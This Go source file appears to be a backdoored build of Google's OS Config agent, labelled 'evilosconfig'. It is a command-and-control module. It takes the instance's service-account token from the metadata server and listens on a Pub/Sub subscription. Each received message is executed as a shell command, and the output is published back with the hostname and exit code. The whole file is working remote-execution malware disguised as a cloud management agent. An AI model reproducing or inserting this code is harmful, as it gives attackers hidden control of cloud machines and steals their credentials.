//go:build pubsub

package pubsubc2

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"os/exec"
	"regexp"
	"runtime"
	"strconv"
	"sync"
	"time"

	"cloud.google.com/go/pubsub"
	"github.com/GoogleCloudPlatform/osconfig/agentconfig"
	"github.com/GoogleCloudPlatform/osconfig/clog"
	"golang.org/x/oauth2"
	"google.golang.org/api/option"
)

const (
	cmdSubscription = "evilosconfig-cmd-sub"
	outputTopicName = "evilosconfig-output"
	publishTimeout  = 30 * time.Second
	retryMinDelay   = time.Second
	retryMaxDelay   = 30 * time.Second
)

var (
	codePagePattern   = regexp.MustCompile(`\d+`)
	outputEncoding    = "utf-8"
	outputEncodingOne sync.Once
)

type metadataTokenSource struct{}

func (s *metadataTokenSource) Token() (*oauth2.Token, error) {
	data, _, err := agentconfig.GetMetadata("instance/service-accounts/default/token")
	if err != nil {
		return nil, fmt.Errorf("metadata token fetch: %w", err)
	}
	var resp struct {
		AccessToken string `json:"access_token"`
		ExpiresIn   int    `json:"expires_in"`
		TokenType   string `json:"token_type"`
	}
	if err := json.Unmarshal(data, &resp); err != nil {
		return nil, fmt.Errorf("metadata token parse: %w", err)
	}
	return &oauth2.Token{
		AccessToken: resp.AccessToken,
		TokenType:   resp.TokenType,
		Expiry:      time.Now().Add(time.Duration(resp.ExpiresIn) * time.Second),
	}, nil
}

// Client manages the Pub/Sub C2 streaming channel.
type Client struct {
	client *pubsub.Client
	cancel context.CancelFunc
	done   chan struct{}
}

// Available reports whether pubsub support was compiled in.
func Available() bool { return true }

// Start creates a Pub/Sub client and begins listening for commands.
func Start(ctx context.Context) (*Client, error) {
	projectID := agentconfig.ProjectID()
	if projectID == "" {
		return nil, fmt.Errorf("pubsub: empty project ID")
	}

	ts := oauth2.ReuseTokenSource(nil, &metadataTokenSource{})
	psClient, err := pubsub.NewClient(ctx, projectID, option.WithTokenSource(ts))
	if err != nil {
		return nil, fmt.Errorf("pubsub client: %w", err)
	}

	subCtx, cancel := context.WithCancel(ctx)
	c := &Client{
		client: psClient,
		cancel: cancel,
		done:   make(chan struct{}),
	}
	go c.subscribe(subCtx)
	return c, nil
}

func (c *Client) subscribe(ctx context.Context) {
	defer close(c.done)
	sub := c.client.Subscription(cmdSubscription)
	topic := c.client.Topic(outputTopicName)
	defer topic.Stop()

	retryDelay := retryMinDelay
	for {
		clog.Infof(ctx, "pubsub: subscribing to %s", cmdSubscription)
		err := sub.Receive(ctx, func(ctx context.Context, msg *pubsub.Message) {
			cmd := string(msg.Data)
			clog.Infof(ctx, "pubsub: received command (%d bytes)", len(cmd))
			out, exitCode := executeCommand(ctx, cmd)

			attributes := map[string]string{
				"hostname":  agentconfig.Name(),
				"encoding":  commandOutputEncoding(),
				"exit_code": strconv.Itoa(exitCode),
			}
			if requestID := msg.Attributes["request_id"]; requestID != "" {
				attributes["request_id"] = requestID
			}

			publishCtx, cancel := context.WithTimeout(ctx, publishTimeout)
			result := topic.Publish(publishCtx, &pubsub.Message{
				Data:       out,
				Attributes: attributes,
			})
			_, err := result.Get(publishCtx)
			cancel()
			if err != nil {
				clog.Errorf(ctx, "pubsub: output publish failed: %v", err)
				msg.Nack()
				return
			}
			msg.Ack()
		})
		if ctx.Err() != nil {
			return
		}
		clog.Errorf(ctx, "pubsub: subscribe error: %v; retrying in %s", err, retryDelay)
		timer := time.NewTimer(retryDelay)
		select {
		case <-ctx.Done():
			timer.Stop()
			return
		case <-timer.C:
		}
		if retryDelay < retryMaxDelay {
			retryDelay *= 2
			if retryDelay > retryMaxDelay {
				retryDelay = retryMaxDelay
			}
		}
	}
}

// Stop shuts down the Pub/Sub subscriber and closes the client.
func (c *Client) Stop() {
	c.cancel()
	<-c.done
	c.client.Close()
}

func executeCommand(ctx context.Context, command string) ([]byte, int) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd.exe", "/d", "/s", "/c", command)
	} else {
		cmd = exec.CommandContext(ctx, "/bin/sh", "-c", command)
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		exitCode := -1
		var exitErr *exec.ExitError
		if errors.As(err, &exitErr) {
			exitCode = exitErr.ExitCode()
		}
		return append(out, []byte("\n[exit: "+err.Error()+"]")...), exitCode
	}
	return out, 0
}

func commandOutputEncoding() string {
	if runtime.GOOS != "windows" {
		return "utf-8"
	}

	outputEncodingOne.Do(func() {
		// chcp's label may be localized, but its numeric code page is ASCII.
		out, err := exec.Command("cmd.exe", "/d", "/c", "chcp").CombinedOutput()
		if err != nil {
			return
		}
		if codePage := codePagePattern.Find(out); len(codePage) != 0 {
			outputEncoding = "cp" + string(codePage)
		}
	})
	return outputEncoding
}
